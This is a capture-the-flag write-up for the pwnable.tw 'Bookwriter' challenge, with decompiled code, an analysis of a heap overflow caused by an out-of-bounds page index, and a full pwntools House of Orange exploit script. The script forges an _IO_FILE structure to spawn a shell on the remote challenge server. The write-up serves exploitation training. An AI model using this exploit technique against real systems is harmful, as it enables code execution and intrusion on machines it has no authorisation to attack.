---
date: '2025-09-12T15:29:16+07:00'
draft: false
title: 'Bookwriter (350 pts) - pwnable.tw'
tags: ['pwnable.tw', 'House_of_Orange']
---
---

## 0x1. Initial Reconnaissance

### file
```
↪ file bookwriter
bookwriter: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8c3e466870c649d07e84498bb143f1bb5916ae34, stripped
```

### checksec
```
↪ checksec --file=bookwriter
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Full RELRO      Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols	Partial	1		2		bookwriter
```

### ./bookwriter
```
↪ ./bookwriter
Welcome to the BookWriter !
Author :ndd
----------------------
      BookWriter      
----------------------
 1. Add a page        
 2. View a page       
 3. Edit a page       
 4. Information       
 5. Exit              
----------------------
Your choice :
```

---

## 0x2. Reverse Engineering

### main
```c
void __fastcall __noreturn main(int a1, char **a2, char **a3)
{
  setvbuf(stdout, 0LL, 2, 0LL);
  puts("Welcome to the BookWriter !");
  sub_400BDF();
  while ( 1 )
  {
    sub_40093A();
    switch ( sub_4008CD() )
    {
      case 1LL:
        sub_4009AA();
        break;
      case 2LL:
        sub_400A99();
        break;
      case 3LL:
        sub_400B27();
        break;
      case 4LL:
        sub_400C04();
        break;
      case 5LL:
        exit(0);
      default:
        puts("Invalid choice");
        break;
    }
  }
}
```

### Author input
```c
__int64 sub_400BDF()
{
  printf("Author :");
  return sub_400856(byte_602060, 64LL);
}
```

### Add a page
```c
int sub_4009AA()
{
  unsigned int i; // [rsp+Ch] [rbp-14h]
  char *v2; // [rsp+10h] [rbp-10h]
  __int64 size; // [rsp+18h] [rbp-8h]

  for ( i = 0; ; ++i )
  {
    if ( i > 8 )
      return puts("You can't add new page anymore!");
    if ( !(&qword_6020A0)[i] )
      break;
  }
  printf("Size of page :");
  size = sub_4008CD();
  v2 = (char *)malloc(size);
  if ( !v2 )
  {
    puts("Error !");
    exit(0);
  }
  printf("Content :");
  sub_400856(v2, (unsigned int)size);
  (&qword_6020A0)[i] = v2;
  qword_6020E0[i] = size;
  ++dword_602040;
  return puts("Done !");
}
```

### View a page
```c
int sub_400A99()
{
  unsigned int v1; // [rsp+Ch] [rbp-4h]

  printf("Index of page :");
  v1 = sub_4008CD();
  if ( v1 > 7 )
  {
    puts("out of page:");
    exit(0);
  }
  if ( !(&qword_6020A0)[v1] )
    return puts("Not found !");
  printf("Page #%u \n", v1);
  return printf("Content :\n%s\n", (&qword_6020A0)[v1]);
}
```

### Edit a page
```c
int sub_400B27()
{
  unsigned int v1; // [rsp+Ch] [rbp-4h]

  printf("Index of page :");
  v1 = sub_4008CD();
  if ( v1 > 7 )
  {
    puts("out of page:");
    exit(0);
  }
  if ( !(&qword_6020A0)[v1] )
    return puts("Not found !");
  printf("Content:");
  sub_400856((&qword_6020A0)[v1], (unsigned int)qword_6020E0[v1]);
  qword_6020E0[v1] = strlen((&qword_6020A0)[v1]);
  return puts("Done !");
}
```

### Info
```c
unsigned __int64 sub_400C04()
{
  int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  v1 = 0;
  printf("Author : %s\n", byte_602060);
  printf("Page : %u\n", (unsigned int)dword_602040);
  printf("Do you want to change the author ? (yes:1 / no:0) ");
  _isoc99_scanf("%d", &v1);
  if ( v1 == 1 )
    sub_400BDF();
  return __readfsqword(0x28u) ^ v2;
}
```

---

## 0x3. Analysis

In this challenge, you have 4 options as you can see above. 

- The vulnerabilities is that :
    - You can write 64 bytes to author field, which is right above the array stores address of chunks. That means you can get the address of the first chunk.
    - As you can see in the function to add a page, they store the address of chunks to 0x6020A0 and the size we allocate to 0x6020E0. The most noticeable point is that ```0x6020E0 - 0x6020A0 = 0x40```, and they allow you to add 9 pages. As a result, in page 9, they will store the address of page 9 to 0x6020E0, which is the size of the first page, thus you can edit the first page to overflow the heap.

--- 
## 0x4. Exploit

You can use House of Orange attack to solve this challenge, that you can read it [here](https://guyinatuxedo.github.io/43-house_of_orange/house_orange_exp/index.html) and [here](https://nguyendd123.github.io/blogs/houseoforange/).

After put the top chunk into unsortedbin, you can allocate a small chunk to get the address of ```main_arena```, forge a fake ```IO_FILE_plus``` as they did and you will get the shell.

```bash
pwndbg> unsortedbin
unsortedbin
all [corrupted]
FD: 0x2074a130 ◂— 0
BK: 0x2074a130 —▸ 0x7f18a9dc4510 ◂— 0

pwndbg> p *(struct _IO_FILE_plus *) 0x2074a130
$1 = {
  file = {
    _flags = 1852400175,
    _IO_read_ptr = 0x61 <error: Cannot access memory at address 0x61>,
    _IO_read_end = 0x0,
    _IO_read_base = 0x7f18a9dc4510 "",
    _IO_write_base = 0x2 <error: Cannot access memory at address 0x2>,
    _IO_write_ptr = 0x3 <error: Cannot access memory at address 0x3>,
    _IO_write_end = 0x4141414141414141 <error: Cannot access memory at address 0x4141414141414141>,
    _IO_buf_base = 0x4141414141414141 <error: Cannot access memory at address 0x4141414141414141>,
    _IO_buf_end = 0x4141414141414141 <error: Cannot access memory at address 0x4141414141414141>,
    _IO_save_base = 0x4141414141414141 <error: Cannot access memory at address 0x4141414141414141>,
    _IO_backup_base = 0x4141414141414141 <error: Cannot access memory at address 0x4141414141414141>,
    _IO_save_end = 0x4141414141414141 <error: Cannot access memory at address 0x4141414141414141>,
    _markers = 0x4141414141414141,
    _chain = 0x4141414141414141,
    _fileno = 1094795585,
    _flags2 = 1094795585,
    _old_offset = 4702111234474983745,
    _cur_column = 16705,
    _vtable_offset = 65 'A',
    _shortbuf = "A",
    _lock = 0x4141414141414141,
    _offset = 4702111234474983745,
    _codecvt = 0x4141414141414141,
    _wide_data = 0x4141414141414141,
    _freeres_list = 0x4141414141414141,
    _freeres_buf = 0x4141414141414141,
    __pad5 = 4702111234474983745,
    _mode = 0,
    _unused2 = 'A' <repeats 20 times>
  },
  vtable = 0x2074a010
}
```

### Exploit

```py
#!/usr/bin/env python3

from pwn import *

exe = ELF("./bookwriter_patched")
libc = ELF("./libc_64.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe
context.log_level = "debug"

def conn():
    if args.LOCAL:
        r = process([exe.path])
        # r = gdb.debug ([exe.path], "b *__libc_start_main+214")
    else:
        r = remote("chall.pwnable.tw", 10304)

    return r

def add_page (p, size, content):
    p.sendafter (b'Your choice :', b'1')
    p.sendafter (b'Size of page :', size)
    p.sendafter (b'Content :', content)

def view_page (p, id):
    p.sendafter (b'Your choice :', b'2')
    p.sendafter (b'Index of page :', id)

def edit_page (p, id, content):
    p.sendafter (b'Your choice :', b'3')
    p.sendafter (b'Index of page :', id)
    p.sendafter (b'Content:', content)

def info (p, status, author, old_author):
    p.sendafter (b'Your choice :', b'4')
    p.recvuntil (old_author)
    current_author = u64 (p.recv (4) + b'\x00' * 4)

    p.sendlineafter (b'Do you want to change the author ? (yes:1 / no:0) ', status)
    if status == b'1':
        p.sendafter (b'Author :', author)

    return current_author

def main():
    p = conn()
    p.sendafter (b'Author :', b'A' * 64)

    add_page (p, b'24', b'A' * 24)
    edit_page (p, b'0', b'A' * 24)
    edit_page (p, b'0', b'A' * 24 + b'\xe1\x0f\x00')

    add_page (p, b'4096', b'1')

    add_page (p, b'64', b'A' * 8)
    view_page (p, b'2')
    p.recvuntil (b'Content :\n' + b'A' * 8)
    leak_libc = u64 (p.recv (6) + 2 * b'\x00')
    libc.address = leak_libc - libc.symbols['main_arena'] - 1640
    print ("The address of leak from libc is: ", hex (leak_libc))
    print ("The address of libc is: ", hex (libc.address))

    leak_heap = info (p, b'0', b'', b'A' * 64)
    print ("The address of heap is: ", hex (leak_heap - 0x10))

    for i in range (5):
        add_page (p, b'24', 24 * b'A')
    edit_page (p, b'0', b'\x00')
    add_page (p, b'24', b'asdf')


    payload = b'A' * 16 + p64 (libc.symbols["system"]) + p64 (libc.symbols['system']) + p64 (0) * 3
    payload = payload.ljust (0x120, b'A')
    payload += b'/bin/sh\x00' + p64 (0x61) + p64 (0) + p64 (libc.symbols['_IO_list_all'] - 0x10)
    payload += p64 (2) + p64 (3) ## write_base and write_ptr
    payload += 0x90 * b'A' # the rest
    payload += p32 (0) # _mode
    payload += b"A" * 0x14 # char unused[20]
    payload += p64 (leak_heap) # v_table

    edit_page (p, b'0', payload)
    edit_page (p, b'0', b'\x00')
    p.sendafter (b'Your choice :', b'1')
    p.sendafter (b'Size of page :', b'10')

    p.interactive()


if __name__ == "__main__":
    main()
```



